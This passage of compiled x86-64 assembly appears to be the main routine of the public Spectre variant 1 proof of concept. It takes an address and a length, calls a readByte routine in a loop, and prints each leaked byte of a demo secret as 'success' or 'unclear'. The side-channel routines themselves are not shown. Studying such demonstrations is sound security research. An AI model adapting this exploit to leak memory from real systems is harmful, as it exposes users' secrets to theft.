	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$64, %rsp
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movl	$0, -20(%rbp)
	movl	%edi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	$8, %edi
	callq	_malloc
	movq	%rax, %rcx
	movq	_target@GOTPCREL(%rip), %rax
	movq	%rcx, (%rax)
	movq	_secret(%rip), %rdi
	callq	_strlen
                                        ## kill: def $eax killed $eax killed $rax
	movl	%eax, -40(%rbp)
	movq	_secret(%rip), %rax
	movq	%rax, -48(%rbp)
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-48(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-40(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
LBB4_2:
	movl	-40(%rbp), %esi
	movq	-48(%rbp), %rdx
	leaq	L_.str.3(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB4_3:                                 ## =>This Inner Loop Header: Depth=1
	movl	-40(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -40(%rbp)
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	-48(%rbp), %rdi
	movq	%rdi, %rax
	addq	$1, %rax
	movq	%rax, -48(%rbp)
	leaq	-34(%rbp), %rsi
	leaq	-16(%rbp), %rdx
	callq	_readByte
	movl	-16(%rbp), %ecx
	movl	-12(%rbp), %edx
	shll	%edx
	leaq	L_.str.7(%rip), %rsi
	leaq	L_.str.6(%rip), %rax
	cmpl	%edx, %ecx
	cmovgeq	%rax, %rsi
	leaq	L_.str.5(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movsbl	-34(%rbp), %eax
	movl	%eax, -52(%rbp)    # # 4-byte Spill
	movsbl	-34(%rbp), %eax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_7:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	$63, %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_8:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	-52(%rbp), %esi    # # 4-byte Reload
	movl	-56(%rbp), %edx    # # 4-byte Reload
	leaq	L_.str.8(%rip), %rdi
	movb	$0, %al
	callq	_printf
	jmp	LBB4_3
LBB4_9:
	leaq	L_.str.9(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rdi
	callq	_free
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB4_11
## %bb.10:
	xorl	%eax, %eax
	addq	$64, %rsp
	popq	%rbp
	retq
LBB4_11:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__cstring,cstring_literals
L_.str:                                 ## @.str
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.section	__DATA,__data
	.globl	_secret                         ## @secret
	.p2align	3, 0x0
_secret:
	.quad	L_.str
	.comm	_channel,262144,4               ## @channel
	.comm	_target,8,3                     ## @target
	.section	__TEXT,__cstring,cstring_literals
	L_.str.1	:    # # @.str.1
	.asciz	"%p"
	L_.str.2	:    # # @.str.2
	.asciz	"%d"
	L_.str.3	:    # # @.str.3
	.asciz	"Reading %d bytes starting at %p:\n"
	L_.str.4	:    # # @.str.4
	.asciz	"reading %p..."
	L_.str.5	:    # # @.str.5
	.asciz	"%s: "
	L_.str.6	:    # # @.str.6
	.asciz	"success"
	L_.str.7	:    # # @.str.7
	.asciz	"unclear"
	L_.str.8	:    # # @.str.8
	.asciz	"0x%02X='%c'\n"
	L_.str.9	:    # # @.str.9
	.asciz	"\n"
.subsections_via_symbols
